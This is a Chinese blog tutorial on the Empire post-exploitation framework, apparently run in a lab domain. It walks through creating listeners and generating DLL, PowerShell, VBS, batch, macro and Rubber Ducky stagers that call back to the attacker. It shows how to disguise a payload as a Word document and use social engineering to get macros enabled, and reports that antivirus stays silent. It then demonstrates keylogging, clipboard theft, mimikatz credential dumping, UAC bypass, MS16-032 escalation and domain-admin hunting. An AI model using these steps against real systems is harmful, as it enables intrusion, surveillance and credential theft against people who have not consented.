# 初识域渗透利器Empire



Empire 是一款类似Metasploit 的渗透测试框架，基于python 编写，Empire是一个纯粹的PowerShell 后开发代理，建立在密码安全通信和灵活的架构上。Empire 实现了无需powershell.exe 即可运行PowerShell 代理的功能，从键盘记录器到Mimikatz 等快速部署的后期开发模块，以及适应性通信以避开网络检测，所有这些都包含在以可用性为重点的框架中。

 

# 1）首先是下载、安装

 

```
git clone https://github.com/EmpireProject/Empire
```

 

不喜欢用命令的同学可以去安装一个GUI界面的，也是国外大牛用php写的一个web界面

```
git clone https://github.com/interference-security/empire-web
```

 

## 下载

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190320084233611-1506922021.png)

 

## 安装

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190320084349627-1062780506.png)

 打开Empire

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190320090802248-1610782140.png)

 

# 2） 设置监听

 

help命令查看具体帮助

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190320090943090-1500961287.png)

参数的用法对照表：

```
Agents—— 未来回连的靶机；

creds—— 便是数据库中写入的各类凭据（主要为口令一类）；

interacrt——与现有agents宝宝们交互（实际并非一个交互性shell，Empire其实类似一款http/https仿造浏览器请求侦察与控守混合型木马，通道隐藏性较好可惜牺牲了流量，wireshark抓包你会发现核心防火墙上的request包流浪有多么恐怖～）；

list—— 后跟listeners或agents列出当前活跃的监听器或服务端宝宝；

listeners—— 进入监听器设置接口；

load—— 加载自定义模块或其他扩展模块接口（默认为empire当前目录）；

plugin—— 加载自定义插件或其他扩展插件；

 plugins—— 列出所有载入的插件列表； 

preobfuscate——预混淆功能。食之无味，弃之可惜，谓之鸡肋。还是介绍一下，需要在系统上预装wine和powershell，但是wine本身的不稳定，笔者也不知道怎么去描述这个功能的设计目的了。预混淆顾名思义就是预先对所有加入了该功能接口的脚本执行混淆操作，增强其后渗透阶段免杀能力，不过，笔者表示懒得去用；

reload—— 同MSFreload功能；

report—— 输出报告；

reset—— 重置ip黑白名单、混淆项目等；

resource—— 批量导入empire命令执行；

searchmodule—— 模块关键词搜索（命令行界面优于GUI界面）；

set—— 设置ip黑白名单、混淆项目等；

show—— 查看当前框架设置，也就是set默认值；

usemodule—— 使用某一模块；

usestager—— 使用某一载荷。
```



## Listeners监听线程

首先你要建立一个本地的Listener，（和Metasploit创建监听载荷一个道理）输入listeners命令将跳到listener管理菜单。你可以随时使用list命令列出被激活的listener。Info命令将显示当前listener配置的选项。

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190320091557668-15070318.png)

 

 ![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190320091545473-1991033920.png)



listener之后空格加敲2下TAB列出可供使用的监听器，然后基于我们的需求选择所需要配置的监听器：

这里我们首先选择http，每个监听器具体功能可进入该监听器模块而后info显示进行阅读。

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190320091738345-1619114839.png)

 

使用set命令设置Host/Port参数，可以直接使用域名。

(Empire: listeners/http) > set Name shuteer
(Empire: listeners/http) > set Host 192.168.190.141
(Empire: listeners/http) > execute

这里的host默认是我们的IP，输入info查看设置内容，输入execute命令即可开始监听。

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190320092355812-1731012494.png)

Back命令即可返回上一层 ，

list命令可以列出当前激活的listener，

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190320092447445-931031995.png)

kill命令可以删除该监听。

![](http://ww1.sinaimg.cn/large/007bHQE8gy1g5ubl48m1cj30on08k7a4.jpg)

 

# 3）生成木马

设置完监听，接着就要生成木马然后在目标机器上运行，可以把这个理解成Metasploit里面的Payload，Empire里拥有多个模块化的`stager`，接着输入`usestaager`来设置采用何种模块，同样，通过双击Tab键，可以看到一共有26个模块。

## Stagers 

Empire在./lib/stagers/*里实现了多个模块化的stagers。包含有dlls,macros,one-liners等等。使用usestager <tab>列出所有可用的stagers。

 

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190320092925576-2111824913.png)

 multi模块为通用模块，osx是Mac操作系统的模块，剩下的就是windows的模块

## 1>生成DLL木马

dll 进程注入马应该是平日里用的最多的方式了，输入`usestager windows/dll `的命令，然后输入info 命令来查看详细参数

```
(Empire: listeners) > usestager windows/dll
(Empire: stager/windows/dll) > info
```

 

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190320093133243-793631560.png)

 

 这里我们设置一下`Listener`，然后执行`execute`命令，就会在tmp目录下生成launcher.dll的木马

```
(Empire: stager/windows/dll) > set Listener shuteer
(Empire: stager/windows/dll) > execute
```

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190320093335988-2050667620.png)

![img](https://img2018.cnblogs.com/blog/1545399/201903/1545399-20190320093433641-2132826850.png)

 

然后将launcher.dll在目标主机上运行后，就会成功上线。

*注意：当然也可以用于NSA方程式工具当中的双重脉冲SMB后门，毕竟最开始Empire被广泛关注就是结合NSA后门程序反弹shell利用的Youtube视频。*

## 2>.launcher

如果只是需要简单的powershell代码，在设置完相应模块后，可以直接在监听器菜单中键入“launcher <language> <listenerName>”，这将很快为您生成一行base64编码代码，这里输入back命令回到listeners下，然后输入launcher powershell shuteer(当前设置的listener名字)命令来生成一个Payload。如下图所示。

![http://p1.qhimg.com/t0125a9a8e2bd71b1f5.png](http://p1.qhimg.com/t0125a9a8e2bd71b1f5.png)

我将生成的这段命令在装有powershell的目标机上执行，就会得到这个主机的权限，这里我们使用的虚拟机是win2008 R2的64位Enterprise版，安装有有杀毒软件，我们直接COPY这段命令到虚拟机webshell下执行，如下图所示。

[![http://p6.qhimg.com/t01c0fae8288505465b.png](http://p6.qhimg.com/t01c0fae8288505465b.png)](http://p6.qhimg.com/t01c0fae8288505465b.png)

可以看到Empire已经上线了一个Name为L9FPTXV6的主机，而且所有杀毒均没有任何提示，输入agents就可以看到上线目标主机的具体内容，这里的Agents就相当于Metasploit的会话sessions如下图所示。

[![http://p6.qhimg.com/t01b2e23bfbe44ca8c6.png](http://p6.qhimg.com/t01b2e23bfbe44ca8c6.png)](http://p6.qhimg.com/t01b2e23bfbe44ca8c6.png)

这里的代理Name他会取一个随机的名字，这里我们可以修改这个随机名字，使用rename <oldAgentName> <newAgentName>命令，这里我们输入rename L9FPTXV6 USA，更改成功，如下图所示。

[![http://p6.qhimg.com/t0117887f24be029a03.png](http://p6.qhimg.com/t0117887f24be029a03.png)](http://p6.qhimg.com/t0117887f24be029a03.png)

agents	  #查看获取的代理会话。

rename   USA usa  	#更改会话名字

intercat  uas 			#和该会话交互

## 3>．launcher_vbs

输入usestager windows/launcher_vbs的命令，然后输入info命令来查看详细参数，如下图所示。

[![http://p1.qhimg.com/t01d046a5ac0825f49b.png](http://p1.qhimg.com/t01d046a5ac0825f49b.png)](http://p1.qhimg.com/t01d046a5ac0825f49b.png)

使用下面命令设置下listener的参数并运行，默认会在tmp文件夹下生成launcher.vbs。如下图所示。

 

```
`Set listener shuteer``Execute`
```

[![http://p0.qhimg.com/t017d3831a1ce71a029.png](http://p0.qhimg.com/t017d3831a1ce71a029.png)](http://p0.qhimg.com/t017d3831a1ce71a029.png)

最后输入back命令回到listeners下开始监听，将生成的这个launcher.vbs在目标机上打开，就会得到这个主机的权限，这里我们使用的虚拟机是win10的64位旗舰版，安装有系统自带的Defender，运行后，成功上线，Defender没有任何提示。如下图所示。

[![http://p2.qhimg.com/t01ca0817ca4ca186cd.png](http://p2.qhimg.com/t01ca0817ca4ca186cd.png)](http://p2.qhimg.com/t01ca0817ca4ca186cd.png)

这里如果要生成powershell代码，设置完Listener后不用execute，直接back，然后输入launcher powershell shuteer即可，如下图所示。

[![http://p0.qhimg.com/t0168bd3a97006da682.png](http://p0.qhimg.com/t0168bd3a97006da682.png)](http://p0.qhimg.com/t0168bd3a97006da682.png)

## 4>.launcher_bat

输入usestager windows/launcher_bat的命令，然后输入info命令查看详细参数，如下图所示。

[![http://p5.qhimg.com/t0138cfc8562ff32704.png](http://p5.qhimg.com/t0138cfc8562ff32704.png)](http://p5.qhimg.com/t0138cfc8562ff32704.png)

使用下面命令设置下listener的参数并输入execute命令运行，默认会在tmp文件夹下生成launcher.bat，如下图所示。

 

```
`Set listener shuteer``Execute`
```

[![http://p6.qhimg.com/t016df029f7fec96add.png](http://p6.qhimg.com/t016df029f7fec96add.png)](http://p6.qhimg.com/t016df029f7fec96add.png)

输入back命令回到listeners下开始监听，然后将生成的这个launcher.bat在目标机上打开，就会得到这个主机的权限，这里我们在虚拟机运行后，可以看到，已经成功上线了。如下图所示。

[![http://p7.qhimg.com/t014e9f0d29ed22bd7d.png](http://p7.qhimg.com/t014e9f0d29ed22bd7d.png)](http://p7.qhimg.com/t014e9f0d29ed22bd7d.png)

为了增加迷惑性，也可以将该批处理插入到一个office文件中，这里随便找个word或者excel文件，点击“插入”标签选择“对象”，然后选择“由文件创建”，点击“浏览”，并选择刚才生成的批处理文件，然后勾选“显示为图标”，点击“更改图标”来更改一个更具诱惑的图标。如下图所示。

[![http://p3.qhimg.com/t013f147ecdd726eebb.png](http://p3.qhimg.com/t013f147ecdd726eebb.png)](http://p3.qhimg.com/t013f147ecdd726eebb.png)

在“更改图标”界面里，我们可以选择一个图标，这里建议使用微软Excel、Word或PowerPoint图标，这里我们使用了word的图标，并且更改文件的名称为研究成果，扩展名改为doc。点击确定后，该对象就会插入到word文件中，如下图所示。

[![http://p2.qhimg.com/t010073e4c38bcca04d.png](http://p2.qhimg.com/t010073e4c38bcca04d.png)](http://p2.qhimg.com/t010073e4c38bcca04d.png)

接着在listeners下监听，然后将该word文件发给目标，一旦在目标机上打开，并运行了内嵌的批处理文件，就会得到这个主机的权限，这里我们使用的虚拟机是win10的64位旗舰版，安装有系统自带的Defender，运行后，成功上线，Defender没有任何提示，杀软会报宏病毒。如下图所示。

[![http://p1.qhimg.com/t012f916af8ac87e338.png](http://p1.qhimg.com/t012f916af8ac87e338.png)](http://p1.qhimg.com/t012f916af8ac87e338.png)

## 5>.macro

输入usestager windows/macro的命令，然后输入info命令来查看详细参数，如下图所示。

[![http://p3.qhimg.com/t0169894a731af02893.png](http://p3.qhimg.com/t0169894a731af02893.png)](http://p3.qhimg.com/t0169894a731af02893.png)

这里使用下面命令设置下listener的参数并输入execute命令运行，如下图所示。

 

```
`Set listener shuteer``Execute`
```

[![http://p2.qhimg.com/t012d8e3958f8f43157.png](http://p2.qhimg.com/t012d8e3958f8f43157.png)](http://p2.qhimg.com/t012d8e3958f8f43157.png)

默认会生成一个宏，储存在/tmp/macro文件中，如下图所示。

[![http://p3.qhimg.com/t01d51bab1859010a0f.png](http://p3.qhimg.com/t01d51bab1859010a0f.png)](http://p3.qhimg.com/t01d51bab1859010a0f.png)

然后我们需要将生成的宏添加到一个Office文档里面，这里还是用上例word文件，点击“视图”标签选择“宏”，宏的位置选择当前文件，宏名随便起一个，然后点击创建，如下图所示。

[![http://p7.qhimg.com/t01e54254ec538c7a1c.png](http://p7.qhimg.com/t01e54254ec538c7a1c.png)](http://p7.qhimg.com/t01e54254ec538c7a1c.png)

点击创建后，会弹出VB编辑界面，将里面原来的代码删除，把我们生成的宏复制进去，另存为“Word 97-2003文档（*.doc）”文件。如下图所示。

[![http://p1.qhimg.com/t01babec12ab78bcce6.png](http://p1.qhimg.com/t01babec12ab78bcce6.png)](http://p1.qhimg.com/t01babec12ab78bcce6.png)

[![http://p6.qhimg.com/t0126e05df5192a2275.png](http://p6.qhimg.com/t0126e05df5192a2275.png)](http://p6.qhimg.com/t0126e05df5192a2275.png)

最后我将这个修改过的word拷到目标机上执行，打开后会提示一个安全警告，这里需要使用一些社会工程学的策略，诱导目标点击“启用内容”。如下图所示。

[![http://p7.qhimg.com/t011bf487484b33c26b.png](http://p7.qhimg.com/t011bf487484b33c26b.png)](http://p7.qhimg.com/t011bf487484b33c26b.png)

这里我们点击“启用内容”，可以看到在我们的监听界面下面，目标机已经顺利上线了。实际测试杀软会报宏病毒。

[![http://p7.qhimg.com/t017ed2d64e04d6f888.png](http://p7.qhimg.com/t017ed2d64e04d6f888.png)](http://p7.qhimg.com/t017ed2d64e04d6f888.png)

如果要删除该主机，同样使用kill或者remove命令，如下图所示。

[![http://p2.qhimg.com/t011f946426da164a1a.png](http://p2.qhimg.com/t011f946426da164a1a.png)](http://p2.qhimg.com/t011f946426da164a1a.png)

## 6.Ducky

Empire也支持ducky 模块，也就是我们常说的“小黄鸭”，输入usestager windows/ducky命令，然后输入info命令来查看详细参数，如下图所示。

[![http://p5.qhimg.com/t01a9b1f3ba4799838c.png](http://p5.qhimg.com/t01a9b1f3ba4799838c.png)](http://p5.qhimg.com/t01a9b1f3ba4799838c.png)

这里只要设置下Listener参数，就可以生成用于烧制的代码，如下图所示。

[![http://p0.qhimg.com/t015a6ff1bbf142aea5.png](http://p0.qhimg.com/t015a6ff1bbf142aea5.png)](http://p0.qhimg.com/t015a6ff1bbf142aea5.png)

将该代码烧制“小黄鸭”中，插入对方电脑，就可以反弹回来。具体操作流程可以参考这篇文章：[利用USB RUBBER DUCKY（USB 橡皮鸭）在目标机器上启动Empire或Meterpreter会话](http://www.freebuf.com/geek/141839.html)。

 

# 4)连接代理及基本使用

 

------

目标主机反弹成功以后，我们可以使用agents命令列出当前已激活的代理，这里注意带有（*）的是已提权成功的代理。如下图所示。

[![http://p6.qhimg.com/t013d7d017e778d0d97.png](http://p6.qhimg.com/t013d7d017e778d0d97.png)](http://p6.qhimg.com/t013d7d017e778d0d97.png)

然后使用interact命令连接代理，代理的名称支持TAB键的补全，连接成功后，我们输入help命令可以列出所有的命令，如下图所示。

[![http://p9.qhimg.com/t0179ec5fad22912cae.png](http://p9.qhimg.com/t0179ec5fad22912cae.png)](http://p9.qhimg.com/t0179ec5fad22912cae.png)

可以看到功能相当强大，基本可以和Metasploit媲美，更为强大的是兼容windows，linux和metasploit的部分常用命令，使用上手相当快，如下图所示。

[![http://p2.qhimg.com/t011bd62483b997de54.png](http://p2.qhimg.com/t011bd62483b997de54.png)](http://p2.qhimg.com/t011bd62483b997de54.png)

输入help agentcmds可以看到可供使用的常用命令，如下图所示。

[![http://p7.qhimg.com/t017a8a2f7eb1b7e29e.png](http://p7.qhimg.com/t017a8a2f7eb1b7e29e.png)](http://p7.qhimg.com/t017a8a2f7eb1b7e29e.png)

使用cmd命令的时候，要使用“shell+命令”的格式，如下图所示。

[![http://p7.qhimg.com/t0106c55a2abfcbc32d.png](http://p7.qhimg.com/t0106c55a2abfcbc32d.png)](http://p7.qhimg.com/t0106c55a2abfcbc32d.png)

我们再试试内置的mimikatz模块，输入mimikatz命令，如下图所示。

[![http://p9.qhimg.com/t0133e9c17b178307e1.png](http://p9.qhimg.com/t0133e9c17b178307e1.png)](http://p9.qhimg.com/t0133e9c17b178307e1.png)

同Metasploit一样，输入creds命令，可以自动过滤整理出获取的用户密码。

[![http://p9.qhimg.com/t0178444cd8c1edf171.png](http://p9.qhimg.com/t0178444cd8c1edf171.png)](http://p9.qhimg.com/t0178444cd8c1edf171.png)

这里有个小技巧，输入creds后双击tab键，可以看到一些选项，如下图所示。

[![http://p6.qhimg.com/t018df783929ea230b2.png](http://p6.qhimg.com/t018df783929ea230b2.png)](http://p6.qhimg.com/t018df783929ea230b2.png)

在内网抓取的密码比较多又乱的时候，可以通过命令来正对hash/plaintext进行排列，增加，删除，导出等操作，这里我们将凭证存储导出为，输入creds export 目录/xx.csv命令，如下图所示。

![img](http://p0.qhimg.com/t011f09c06eb5e01114.png)

实际渗透过程中由于种种原因总会有部分反弹丢失或者失效，可以使用list stale命令来列出已经丢失的反弹代理，然后用remove stale来删去已经失效的反弹。如下图所示。

[![http://p1.qhimg.com/t019f0761a89efa5c1f.png](http://p1.qhimg.com/t019f0761a89efa5c1f.png)](http://p1.qhimg.com/t019f0761a89efa5c1f.png)

其他还有一些常用命令，如bypassuac提权命令，SC截图命令，Download下载文件，upload上传文件等等比较简单就不做演示了，建议大家参照帮助多多尝试其他命令。

# 5>信息收集

 

------

Empire主要用于后渗透。所以信息收集是比较常用的一个模块，我们可以使用searchmodule命令搜索需要使用的模块，这里通过键入“usemodule collection”然后按Tab键来查看完整列表，如下图所示。

[![http://p4.qhimg.com/t01ceacec42329ec6f7.png](http://p2.qhimg.com/t010efce79eb0593511.png)](http://p2.qhimg.com/t010efce79eb0593511.png)

这里我们演示几个常用模块:

## 1.屏幕截图

输入usemodule collection/screenshot，info命令可以查看具体参数，如下图所示。

[![http://p3.qhimg.com/t0167d10ed77f184cda.png](http://p3.qhimg.com/t0167d10ed77f184cda.png)](http://p3.qhimg.com/t0167d10ed77f184cda.png)

不需要做多余设置，直接execute可以看到目标主机屏幕截图。

[![http://p1.qhimg.com/t01634848acca1e6242.png](http://p1.qhimg.com/t01634848acca1e6242.png)](http://p1.qhimg.com/t01634848acca1e6242.png)

[![http://p1.qhimg.com/t01e953bd190d3b671e.png](http://p1.qhimg.com/t01e953bd190d3b671e.png)](http://p1.qhimg.com/t01e953bd190d3b671e.png)

## 2.键盘记录

输入usemodule collection/keylogger，info命令可以查看具体参数，如下图所示。

[![http://p6.qhimg.com/t01fc8e22c09166fdb8.png](http://p6.qhimg.com/t01fc8e22c09166fdb8.png)](http://p6.qhimg.com/t01fc8e22c09166fdb8.png)

设置保持默认就可以，我们输入execute启动，就开启记录键盘输入了，会自动在empire/downloads/<AgentName>下生成一个agent.log，如下图所示。

[![http://p1.qhimg.com/t0163e61e5bc65d753b.png](http://p1.qhimg.com/t0163e61e5bc65d753b.png)](http://p1.qhimg.com/t0163e61e5bc65d753b.png)

这里我们在虚拟机打开一个记事本随便输入一些文字。如下图所示。

[![http://p5.qhimg.com/t01133d9129d1fd1225.png](http://p5.qhimg.com/t01133d9129d1fd1225.png)](http://p5.qhimg.com/t01133d9129d1fd1225.png)

我们打开agent.log可以看到在我们的监控端已经全部记录下来了，虽然不能记录中文，但是大概意思我们还是能看出来的，标点符号也记录了下来，相对来说还是记录英文比较好，如下图所示。

[![http://p1.qhimg.com/t01b0d564bac65e6171.png](http://p1.qhimg.com/t01b0d564bac65e6171.png)](http://p1.qhimg.com/t01b0d564bac65e6171.png)

如果我们要持续进行键盘记录，可以把当前监控模块置于后台，输入jobs会显示当前在后台的记录，如果要终止一个记录，可以使用jobs kill JOB_name，这里可以输入jobs kill N7XE38即可停止键盘记录，如下图所示。

[![http://p1.qhimg.com/t019a5ceb2a45db3ff4.png](http://p1.qhimg.com/t019a5ceb2a45db3ff4.png)](http://p1.qhimg.com/t019a5ceb2a45db3ff4.png)

## 3.剪贴板记录

这个模块允许你抓取存储在目标主机Windows剪贴板上的任何内容。模块参数可以设置抓取限制和间隔时间，一般情况下，保持默认设置就可以，这里我们输入usemodule collection/clipboard_monitor，同样info命令可以查看具体参数，如下图所示。

[![http://p2.qhimg.com/t013a06db7fb8a50839.png](http://p2.qhimg.com/t013a06db7fb8a50839.png)](http://p2.qhimg.com/t013a06db7fb8a50839.png)

我们在目标主机随便COPY一句话，可以看到屏幕已经有结果了，速度还是很快的，如下图所示。

[![http://p4.qhimg.com/t0100bf5e28ce929552.png](http://p4.qhimg.com/t0100bf5e28ce929552.png)](http://p4.qhimg.com/t0100bf5e28ce929552.png)

同样当前监控模块也可以置于后台，输入jobs会显示当前在后台的记录，如果要终止话同样输入jobs kill JOB_name，如下图所示。

[![http://p8.qhimg.com/t0114a6bcb3ae15a653.png](http://p8.qhimg.com/t0114a6bcb3ae15a653.png)](http://p8.qhimg.com/t0114a6bcb3ae15a653.png)

## 4.查找共享

输入usemodule situational_awareness/network/powerview/share_finder 命令将会列出域内所有的共享，可以设置CheckShareAccess选项将只返回可从当前用户上下文中读取的共享，这里保持默认，如下图所示。

[![http://p3.qhimg.com/t0119a82ad4afe88f95.png](http://p3.qhimg.com/t0119a82ad4afe88f95.png)](http://p3.qhimg.com/t0119a82ad4afe88f95.png)

## 5.收集目标主机有用的信息

输入命令usemodule situational_awareness/host/winenum，可以查看本机用户，域组成员，最后密码设置时间，剪贴板内容，系统基本系统信息，网络适配器信息，共享信息等等，如下图所示。

[![http://p2.qhimg.com/t01d5537a4cde4fcf2f.png](http://p2.qhimg.com/t01d5537a4cde4fcf2f.png)](http://p2.qhimg.com/t01d5537a4cde4fcf2f.png)

[![http://p0.qhimg.com/t0148c72f3ecd6244ca.png](http://p0.qhimg.com/t0148c72f3ecd6244ca.png)](http://p0.qhimg.com/t0148c72f3ecd6244ca.png)

 

另外还有situational_awareness/host/computerdetails模块，列举了系统中的基本所有有用信息。显示目标主机事件日志，应用程序控制策略日志，包括RDP登陆信息，Powershell 脚本运行和保存的信息等等。运行这个模块的时候需要管理权限，大家可以试一下。

## 6.ARP扫描

Empire也内置arp扫描模块，输入usemodule situational_awareness/network/arpscan

命令使用该模块，输入info命令查看具体参数，如下图所示。

[![http://p4.qhimg.com/t018729cddf0b2174f8.png](http://p4.qhimg.com/t018729cddf0b2174f8.png)](http://p4.qhimg.com/t018729cddf0b2174f8.png)

 

这里要设置一下Range参数，输入下列命令设置为要扫描的网段，如下图所示。

 

```
`set` `Range 192.168.31.0-192.168.31.254``execute`
```

[![http://p9.qhimg.com/t0114b8ca8ded7b08db.png](http://p9.qhimg.com/t0114b8ca8ded7b08db.png)](http://p9.qhimg.com/t0114b8ca8ded7b08db.png)

同样Empire也内置了端口扫描模块， situational_awareness/network/portscan这里就不演示了。

## 7.DNS信息获取

在内网中，知道所有机器的HostName和对应的IP地址对分析内网结构至关重要，输入usemodule situational_awareness/network/reverse_dns命令使用该模块，输入info命令查看具体参数，如下图所示。

[![http://p4.qhimg.com/t01daa1bfe0cff2e5d3.png](http://p4.qhimg.com/t01daa1bfe0cff2e5d3.png)](http://p4.qhimg.com/t01daa1bfe0cff2e5d3.png)

这里要设置一下Range参数，输入你要扫描的IP网段运行，如下图所示。

[![http://p8.qhimg.com/t013ceeacb59c531c8d.png](http://p8.qhimg.com/t013ceeacb59c531c8d.png)](http://p8.qhimg.com/t013ceeacb59c531c8d.png)

如果该主机同时有2个网卡，Empire也会显示出来，方便我们寻找边界主机。

另一个模块模块situational_awareness/host/dnsserver，可以显示出当前内网DNS服务器IP地址，如下图所示。

[![http://p3.qhimg.com/t01bcc9c5ae8edbc1ff.png](http://p3.qhimg.com/t01bcc9c5ae8edbc1ff.png)](http://p3.qhimg.com/t01bcc9c5ae8edbc1ff.png)

## 8.查找域管登陆服务器IP

在内网渗透中，拿到内网中某一台机器，想要获得域管权限，有一种方法是找到域管登陆的机器，然后横向渗透进去，窃取域管权限，从而拿下整个域，这个模块就是用来查找域管登陆的机器。

使用模块usemodule situational_awareness/network/powerview/user_hunter，输入info查看设置参数，如下图所示。

[![http://p6.qhimg.com/t01358ce44bf42aca45.png](http://p6.qhimg.com/t01358ce44bf42aca45.png)](http://p6.qhimg.com/t01358ce44bf42aca45.png)

这个模块可以清楚看到哪个用户登录了哪台主机，结果显示域管曾经登录过机器名为WIN7-64.shuteer.testlab,IP地址为192.168.31.251的这台机器上。如下图所示。

[![http://p3.qhimg.com/t01fb816ae79ac94716.png](http://p3.qhimg.com/t01fb816ae79ac94716.png)](http://p3.qhimg.com/t01fb816ae79ac94716.png)

## 9.本地管理组访问模块

使用usemodule situational_awareness/network/powerview/find_localadmin_access模块，不需要做什么设置，直接运行execute即可，结果如下图所示。

[![http://p8.qhimg.com/t01891118a668beeeae.png](http://p8.qhimg.com/t01891118a668beeeae.png)](http://p8.qhimg.com/t01891118a668beeeae.png)

可以看到有2台计算机，名字分别为：

WIN7-64.shuteer.testlab

WIN7-X86.shuteer.testlab

## 10.获取域控制器

现在可以用usemodulesituational_awareness/network/powerview/get_domain_controller模块来确定我们当前的域控制器，因为我们有了域用户权限，输入execute，如下图所示。

[![http://p9.qhimg.com/t01c749e20b3fd12b38.png](http://p9.qhimg.com/t01c749e20b3fd12b38.png)](http://p9.qhimg.com/t01c749e20b3fd12b38.png)

当前域服务器名为DC。

我们再验证下能否访问域服务器DC的“C$”，同样顺利访问，如下图所示。

[![http://p4.qhimg.com/t010825ffeb6f4f572a.png](http://p4.qhimg.com/t010825ffeb6f4f572a.png)](http://p4.qhimg.com/t010825ffeb6f4f572a.png)

 

# 6> 提权

 

------

Windows在Vista系统开始引入UAC账户控制体系，分为三个级别：

高:完整的管理员权限

中：标准用户权限

低：很低的权限

即使当前用户是本地管理员，双击运行大部分应用程序时也是以标准用户权限运行的(除非右击-选择以管理员身份运行)。所以即使我们获得的权限是本地管理员权限，也没有办法执行一些命令（特殊注册表写入、LSASS读取/写入等等），所以渗透的第一步便是提权，提权的前提便是知道自己拥有什么权限，可以输入一下命令来查询：

Whoami /groups

这个命令会输出我当前用户所属的组和所拥有的权限，显示High Mandatory Level表示拥有管理员权限，显示Medium Mandatory Level表示拥有一个标准用户权限，这里我们是一个标准用户权限，如下图所示。

[![http://p8.qhimg.com/t01c284526feb2c69d1.png](http://p8.qhimg.com/t01c284526feb2c69d1.png)](http://p8.qhimg.com/t01c284526feb2c69d1.png)

## 1.bypassuac

 输入usemodule privesc/bypassuac，设置Listener参数，运行execute，上线了一个新的反弹，如下图所示。

[![http://p6.qhimg.com/t01d0182d6b2e7459d6.png](http://p6.qhimg.com/t01d0182d6b2e7459d6.png)](http://p6.qhimg.com/t01d0182d6b2e7459d6.png)

这里我们回到agents下面，输入list命令，可以看到多了一个agents，带星号的即为提权成功的，如下图所示。

[![http://p6.qhimg.com/t01629b7c7fc63a1605.png](http://p6.qhimg.com/t01629b7c7fc63a1605.png)](http://p6.qhimg.com/t01629b7c7fc63a1605.png)

## \2. bypassuac_wscript

这个模块大概原理是使用c:\Windows\wscript.exe执行payload，实现管理员权限执行payload，绕过UAC。只适用于系统为Windows 7，目前尚没有对应补丁，部分杀毒软件会有提示。如下图所示，带型号的即为提权成功的。

[![http://p3.qhimg.com/t015830fd836eadde6a.png](http://p3.qhimg.com/t015830fd836eadde6a.png)](http://p3.qhimg.com/t015830fd836eadde6a.png)

## \3. ms16-032

Empire自带了MS16-032 (KB3124280) 模块，输入usemodule privesc/ms16-032，只需要设置下Listener，运行提权成功，如下图所示。

[![http://p1.qhimg.com/t01591f96b75f95d6ed.png](http://p1.qhimg.com/t01591f96b75f95d6ed.png)](http://p1.qhimg.com/t01591f96b75f95d6ed.png)

除了ms16-032，Empire还带了ms16-135(KB3198234)模块，使用方法一样，在测试中，WIN764位系统出现了蓝屏，请谨慎使用。如下图所示。

[![http://p3.qhimg.com/t0180d973c1dccc395f.png](http://p3.qhimg.com/t0180d973c1dccc395f.png)](http://p3.qhimg.com/t0180d973c1dccc395f.png)

## 4.PowerUp

Empire内置了PowerUp部分工具，用于系统提权，主要为Windows错误系统配置漏洞，Windows Services漏洞，AlwaysInstallElevated漏洞等8种提权方式，输入“usemodule privesc/powerup”然后按Tab键来查看完整列表，如下图所示。

[![http://p9.qhimg.com/t01c786b1fcca23914f.png](http://p9.qhimg.com/t01c786b1fcca23914f.png)](http://p9.qhimg.com/t01c786b1fcca23914f.png)

### 4.1 AllChecks模块

如何查找上述漏洞，就要用到这个模块了。和Powersploit下powerup中的Invoke-AllChecks模块一样，该模块可以执行所有脚本检查系统漏洞，输入下列命令，如下图所示。

usemodule privesc/powerup/allchecks

execute

[![http://p4.qhimg.com/t01571670b4eef82d6f.png](http://p4.qhimg.com/t01571670b4eef82d6f.png)](http://p4.qhimg.com/t01571670b4eef82d6f.png)

可以看到，他列出了很多方法，我们可以尝试用第一种方法bypassuac来提权，提权之前我们看下当前agents，可以看到只有一个普通权限，Name为CD3FRRYCFVTYXN3S，IP为192.168.31.251的客户端，如下图所示。

接着我们输入bypassuac test来提权，等几秒钟，就会给我们返回一个更高权限的shell，如下图所示。[![http://p0.qhimg.com/t01c9cf6d744f1f3664.png](http://p0.qhimg.com/t01c9cf6d744f1f3664.png)](http://p0.qhimg.com/t01c9cf6d744f1f3664.png)

[![http://p5.qhimg.com/t010c25b7ae27d0979b.png](http://p5.qhimg.com/t010c25b7ae27d0979b.png)](http://p5.qhimg.com/t010c25b7ae27d0979b.png)

 

我们再次输入agents命令来查看当前agents，可以看到多了一个高权限（带星号）Name为341CNFUFK3PKUDML的客户端，如下图所示，提权成功。

[![http://p0.qhimg.com/t01028a5c8b360f35a0.png](http://p0.qhimg.com/t01028a5c8b360f35a0.png)](http://p0.qhimg.com/t01028a5c8b360f35a0.png)

### 4.2模块使用说明

官方说明如下：

l  对于任何没有引号的服务路径问题

l  对于ACL配置错误的任何服务（可通过service_ *利用  ）

l  服务可执行文件上的任何不当权限（可通过service_exe_ *进行利用）

l  对于任何剩余的unattend.xml文件

l  如果AlwaysInstallElevated注册表项设置

l  如果有任何Autologon凭证留在注册表中

l  用于任何加密的web.config字符串和应用程序池密码

l  对于任何％PATH％.DLL劫持机会（可通过write_dllhijacker利用）

具体使用方法可参见我之间几篇文章：

A.Metasploit、powershell之Windows错误系统配置漏洞实战提权

http://www.freebuf.com/articles/system/131388.html 

B.metasploit之Windows Services漏洞提权实战

http://www.4hou.com/technology/4180.html

C.Metasploit、Powershell之AlwaysInstallElevated提权实战

https://xianzhi.aliyun.com/forum/read/1488.html

## 5.GPP

在域里面很多都会启用组策略首选项来执行本地密码更改，以便于管理和映像部署。缺点是任何普通域用户都可以从相关域控制器的SYSVOL中读取到部署信息。虽然他是采用AES 256加密的，使用usemodule privesc/gpp ，如下图所示。

[![http://p0.qhimg.com/t01358f1a981dc18a28.png](http://p0.qhimg.com/t01358f1a981dc18a28.png)](http://p0.qhimg.com/t01358f1a981dc18a28.png)

 

 

# 7>横向渗透

 

------

## 1.令牌窃取

我们在获取到服务器权限后，可以使用内置mimikatz获取系统密码，执行完毕后输入creds命令查看Empire列举的密码。如下图所示。

